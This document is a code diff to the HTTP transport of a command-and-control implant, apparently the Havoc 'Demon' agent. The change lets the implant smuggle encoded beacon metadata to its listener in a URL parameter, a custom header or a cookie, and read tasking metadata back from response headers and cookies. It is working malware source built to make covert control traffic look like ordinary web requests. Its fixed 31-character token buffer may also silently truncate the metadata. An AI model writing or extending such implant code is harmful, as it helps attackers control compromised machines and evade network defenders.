@@ -1,6 +1,7 @@
 #include <Demon.h>
 
 #include <core/TransportHttp.h>
+#include <core/Base64.h>
 #include <core/MiniStd.h>
 
 #ifdef TRANSPORT_HTTP
@@ -26,6 +27,7 @@ BOOL HttpSend(
     HANDLE  Request        = { 0 };
     LPWSTR  HttpHeader     = { 0 };
     LPWSTR  HttpEndpoint   = { 0 };
+    LPWSTR  AllocEndpoint  = { 0 };
     DWORD   HttpFlags      = { 0 };
     LPCWSTR HttpProxy      = { 0 };
     PWSTR   HttpScheme     = { 0 };
@@ -36,6 +38,10 @@ BOOL HttpSend(
     PVOID   RespBuffer     = { 0 };
     SIZE_T  RespSize       = { 0 };
     BOOL    Successful     = { 0 };
+    PVOID   SendBuffer     = { 0 };
+    SIZE_T  SendLength     = { 0 };
+    PCHAR   MetaEncoded    = { 0 };
+    LPWSTR  MetaHeader     = { 0 };
 
     WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
     WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig      = { 0 };
@@ -95,6 +101,59 @@ BOOL HttpSend(
         HttpFlags |= WINHTTP_FLAG_SECURE;
     }
 
+    /* save original send buffer; we may advance past metadata */
+    SendBuffer = Send->Buffer;
+    SendLength = Send->Length;
+
+    /* if using query parameter location, append ?Name=base64(metadata) to URI */
+    PRINTF_DONT_SEND( "DataReq.Location=%d Name=%ls SendLength=%zu\n",
+        Instance->Config.Transport.DataReq.Location,
+        Instance->Config.Transport.DataReq.Name ? Instance->Config.Transport.DataReq.Name : L"(null)",
+        SendLength )
+
+    if ( Instance->Config.Transport.DataReq.Location == PAYLOAD_LOC_PARAM &&
+         Instance->Config.Transport.DataReq.Name && SendBuffer && SendLength >= METADATA_SIZE )
+    {
+        SIZE_T  EncLen    = 0;
+        SIZE_T  NameLen   = 0;
+        SIZE_T  UriLen    = 0;
+        WCHAR   WideTok[ 32 ] = { 0 };
+
+        PRINTF_DONT_SEND( "PARAM path: encoding %d bytes of metadata\n", METADATA_SIZE )
+
+        MetaEncoded = Base64UrlEncode( SendBuffer, METADATA_SIZE, &EncLen );
+        if ( MetaEncoded )
+        {
+            PRINTF_DONT_SEND( "Base64UrlEncode ok, EncLen=%zu encoded=%s\n", EncLen, MetaEncoded )
+            CharStringToWCharString( WideTok, MetaEncoded, 31 );
+            Instance->Win32.LocalFree( MetaEncoded );
+            MetaEncoded = NULL;
+
+            NameLen = StringLengthW( Instance->Config.Transport.DataReq.Name );
+            UriLen  = StringLengthW( HttpEndpoint );
+
+            /* "uri?name=token\0" */
+            AllocEndpoint = Instance->Win32.LocalAlloc( LPTR,
+                ( UriLen + 1 + NameLen + 1 + EncLen + 1 ) * sizeof( WCHAR ) );
+            if ( AllocEndpoint )
+            {
+                Instance->Win32.swprintf_s( AllocEndpoint,
+                    UriLen + 1 + NameLen + 1 + EncLen + 1,
+                    L"%ls?%ls=%ls", HttpEndpoint, Instance->Config.Transport.DataReq.Name, WideTok );
+                HttpEndpoint = AllocEndpoint;
+                PRINTF_DONT_SEND( "Built URL: %ls\n", HttpEndpoint )
+            }
+
+            SendBuffer = (PBYTE) SendBuffer + METADATA_SIZE;
+            SendLength -= METADATA_SIZE;
+            PRINTF_DONT_SEND( "Adjusted SendLength=%zu\n", SendLength )
+        }
+        else
+        {
+            PUTS_DONT_SEND( "Base64UrlEncode FAILED" )
+        }
+    }
+
     /* PRINTF_DONT_SEND( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, Instance->Config.Transport.Method, HttpEndpoint, HttpFlags ) */
     if ( ! ( Request = Instance->Win32.WinHttpOpenRequest(
         Connect,
@@ -134,6 +193,72 @@ BOOL HttpSend(
 
         Iterator++;
     } while ( TRUE );
+
+    /* inject metadata into header or cookie if configured */
+    if ( Instance->Config.Transport.DataReq.Location == PAYLOAD_LOC_HEADER &&
+         Instance->Config.Transport.DataReq.Name && SendBuffer && SendLength >= METADATA_SIZE &&
+         SendBuffer == Send->Buffer /* not already extracted by PARAM path */ )
+    {
+        SIZE_T EncLen  = 0;
+        SIZE_T NameLen = 0;
+        WCHAR  WideTok[ 32 ] = { 0 };
+
+        MetaEncoded = Base64Encode( SendBuffer, METADATA_SIZE, &EncLen );
+        if ( MetaEncoded )
+        {
+            CharStringToWCharString( WideTok, MetaEncoded, 31 );
+            Instance->Win32.LocalFree( MetaEncoded );
+            MetaEncoded = NULL;
+
+            NameLen = StringLengthW( Instance->Config.Transport.DataReq.Name );
+            /* "Name: token\r\n\0" */
+            MetaHeader = Instance->Win32.LocalAlloc( LPTR,
+                ( NameLen + 2 + EncLen + 3 ) * sizeof( WCHAR ) );
+            if ( MetaHeader )
+            {
+                Instance->Win32.swprintf_s( MetaHeader, NameLen + 2 + EncLen + 3,
+                    L"%ls: %ls\r\n", Instance->Config.Transport.DataReq.Name, WideTok );
+                Instance->Win32.WinHttpAddRequestHeaders( Request, MetaHeader, -1, WINHTTP_ADDREQ_FLAG_ADD );
+                Instance->Win32.LocalFree( MetaHeader );
+                MetaHeader = NULL;
+            }
+
+            SendBuffer = (PBYTE) SendBuffer + METADATA_SIZE;
+            SendLength -= METADATA_SIZE;
+        }
+    }
+    else if ( Instance->Config.Transport.DataReq.Location == PAYLOAD_LOC_COOKIE &&
+              Instance->Config.Transport.DataReq.Name && SendBuffer && SendLength >= METADATA_SIZE &&
+              SendBuffer == Send->Buffer )
+    {
+        SIZE_T EncLen  = 0;
+        SIZE_T NameLen = 0;
+        WCHAR  WideTok[ 32 ] = { 0 };
+
+        MetaEncoded = Base64Encode( SendBuffer, METADATA_SIZE, &EncLen );
+        if ( MetaEncoded )
+        {
+            CharStringToWCharString( WideTok, MetaEncoded, 31 );
+            Instance->Win32.LocalFree( MetaEncoded );
+            MetaEncoded = NULL;
+
+            NameLen = StringLengthW( Instance->Config.Transport.DataReq.Name );
+            /* "Cookie: Name=token\r\n\0" */
+            MetaHeader = Instance->Win32.LocalAlloc( LPTR,
+                ( 8 + NameLen + 1 + EncLen + 3 ) * sizeof( WCHAR ) );
+            if ( MetaHeader )
+            {
+                Instance->Win32.swprintf_s( MetaHeader, 8 + NameLen + 1 + EncLen + 3,
+                    L"Cookie: %ls=%ls\r\n", Instance->Config.Transport.DataReq.Name, WideTok );
+                Instance->Win32.WinHttpAddRequestHeaders( Request, MetaHeader, -1, WINHTTP_ADDREQ_FLAG_ADD );
+                Instance->Win32.LocalFree( MetaHeader );
+                MetaHeader = NULL;
+            }
+
+            SendBuffer = (PBYTE) SendBuffer + METADATA_SIZE;
+            SendLength -= METADATA_SIZE;
+        }
+    }
 
     if ( Instance->Config.Transport.Proxy.Enabled ) {
 
@@ -244,21 +369,118 @@ BOOL HttpSend(
     }
 
     /* Send package to our listener */
-    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, Send->Buffer, Send->Length, Send->Length, 0 ) ) {
+    PRINTF_DONT_SEND( "WinHttpSendRequest: Method=%ls Endpoint=%ls SendLength=%zu Secure=%d\n",
+        Instance->Config.Transport.Method, HttpEndpoint, SendLength, Instance->Config.Transport.Secure )
+
+    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0,
+         SendLength > 0 ? SendBuffer : NULL, SendLength, SendLength, 0 ) )
+    {
         if ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
             /* Is the server recognizing us ? are we good ?  */
-            if ( HttpQueryStatus( Request ) != HTTP_STATUS_OK ) {
-                PUTS_DONT_SEND( "HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)" )
+            DWORD _StatusCode = HttpQueryStatus( Request );
+            if ( _StatusCode != HTTP_STATUS_OK ) {
+                PRINTF_DONT_SEND( "HttpQueryStatus Failed: got %d, expected 200\n", _StatusCode )
                 Successful = FALSE;
                 goto LEAVE;
             }
 
             if ( Resp ) {
-                RespBuffer = NULL;
+                PBYTE  RespMeta     = NULL;
+                SIZE_T RespMetaSize = 0;
 
-                //
-                // read the entire response into the Resp BUFFER
-                //
+                PRINTF_DONT_SEND( "Response: DataResp.Location=%d Name=%ls\n",
+                    Instance->Config.Transport.DataResp.Location,
+                    Instance->Config.Transport.DataResp.Name ? Instance->Config.Transport.DataResp.Name : L"(null)" )
+
+                /* extract response metadata from header if configured (PARAM falls back to header) */
+                if ( ( Instance->Config.Transport.DataResp.Location == PAYLOAD_LOC_HEADER ||
+                       Instance->Config.Transport.DataResp.Location == PAYLOAD_LOC_PARAM ) &&
+                     Instance->Config.Transport.DataResp.Name )
+                {
+                    WCHAR  HdrBuf[ 128 ] = { 0 };
+                    DWORD  HdrSize       = sizeof( HdrBuf );
+                    CHAR   NarrowHdr[ 64 ] = { 0 };
+
+                    BOOL hdrOk = Instance->Win32.WinHttpQueryHeaders( Request,
+                         WINHTTP_QUERY_CUSTOM, Instance->Config.Transport.DataResp.Name,
+                         HdrBuf, &HdrSize, WINHTTP_NO_HEADER_INDEX );
+                    PRINTF_DONT_SEND( "WinHttpQueryHeaders(%ls): %s (err=%d)\n",
+                        Instance->Config.Transport.DataResp.Name,
+                        hdrOk ? "OK" : "FAILED", NtGetLastError() )
+
+                    if ( hdrOk )
+                    {
+                        SIZE_T i = 0;
+                        for ( ; i < HdrSize / sizeof( WCHAR ) && i < 63; i++ )
+                            NarrowHdr[ i ] = (CHAR) HdrBuf[ i ];
+                        NarrowHdr[ i ] = '\0';
+
+                        PRINTF_DONT_SEND( "Response header value: %s (len=%zu)\n", NarrowHdr, i )
+                        RespMeta = Base64Decode( NarrowHdr, i, &RespMetaSize );
+                        PRINTF_DONT_SEND( "Base64Decode: RespMetaSize=%zu\n", RespMetaSize )
+                    }
+                }
+                else if ( Instance->Config.Transport.DataResp.Location == PAYLOAD_LOC_COOKIE &&
+                          Instance->Config.Transport.DataResp.Name )
+                {
+                    WCHAR  HdrBuf[ 512 ] = { 0 };
+                    DWORD  HdrSize       = sizeof( HdrBuf );
+                    CHAR   NarrowHdr[ 256 ] = { 0 };
+
+                    if ( Instance->Win32.WinHttpQueryHeaders( Request,
+                         WINHTTP_QUERY_SET_COOKIE, WINHTTP_HEADER_NAME_BY_INDEX,
+                         HdrBuf, &HdrSize, WINHTTP_NO_HEADER_INDEX ) )
+                    {
+                        SIZE_T i = 0;
+                        for ( ; i < HdrSize / sizeof( WCHAR ) && i < 255; i++ )
+                            NarrowHdr[ i ] = (CHAR) HdrBuf[ i ];
+                        NarrowHdr[ i ] = '\0';
+
+                        /* find "Name=" in cookie string */
+                        CHAR   SearchName[ 128 ] = { 0 };
+                        SIZE_T NameLen = StringLengthW( Instance->Config.Transport.DataResp.Name );
+                        SIZE_T j = 0;
+                        for ( ; j < NameLen && j < 126; j++ )
+                            SearchName[ j ] = (CHAR) Instance->Config.Transport.DataResp.Name[ j ];
+                        SearchName[ j ] = '=';
+                        SearchName[ j + 1 ] = '\0';
+
+                        PCHAR Found = NULL;
+                        for ( SIZE_T k = 0; k < i; k++ )
+                        {
+                            BOOL Match = TRUE;
+                            for ( SIZE_T m = 0; SearchName[ m ]; m++ )
+                            {
+                                if ( k + m >= i || NarrowHdr[ k + m ] != SearchName[ m ] )
+                                { Match = FALSE; break; }
+                            }
+                            if ( Match ) { Found = &NarrowHdr[ k + j + 1 ]; break; }
+                        }
+
+                        if ( Found )
+                        {
+                            SIZE_T ValLen = 0;
+                            while ( Found[ ValLen ] && Found[ ValLen ] != ';' && Found[ ValLen ] != ' ' )
+                                ValLen++;
+                            RespMeta = Base64Decode( Found, ValLen, &RespMetaSize );
+                        }
+                    }
+                }
+
+                RespBuffer = NULL;
+                RespSize   = 0;
+
+                /* if we extracted metadata from a header, prepend it */
+                if ( RespMeta && RespMetaSize > 0 )
+                {
+                    RespBuffer = Instance->Win32.LocalAlloc( LPTR, RespMetaSize );
+                    MemCopy( RespBuffer, RespMeta, RespMetaSize );
+                    RespSize = RespMetaSize;
+                    Instance->Win32.LocalFree( RespMeta );
+                    RespMeta = NULL;
+                }
+
+                /* read the body (bulk payload) */
                 do {
                     Successful = Instance->Win32.WinHttpReadData( Request, Buffer, sizeof( Buffer ), &BufRead );
                     if ( ! Successful || BufRead == 0 ) {
@@ -280,6 +502,7 @@ BOOL HttpSend(
                 Resp->Length = RespSize;
                 Resp->Buffer = RespBuffer;
 
+                PRINTF_DONT_SEND( "Response total: RespSize=%zu (meta=%zu + body)\n", RespSize, RespMetaSize )
                 Successful = TRUE;
             }
         }
@@ -292,6 +515,16 @@ BOOL HttpSend(
     }
 
 LEAVE:
+    if ( AllocEndpoint ) {
+        Instance->Win32.LocalFree( AllocEndpoint );
+        AllocEndpoint = NULL;
+    }
+
+    if ( MetaEncoded ) {
+        Instance->Win32.LocalFree( MetaEncoded );
+        MetaEncoded = NULL;
+    }
+
     if ( Connect ) {
         Instance->Win32.WinHttpCloseHandle( Connect );
     }
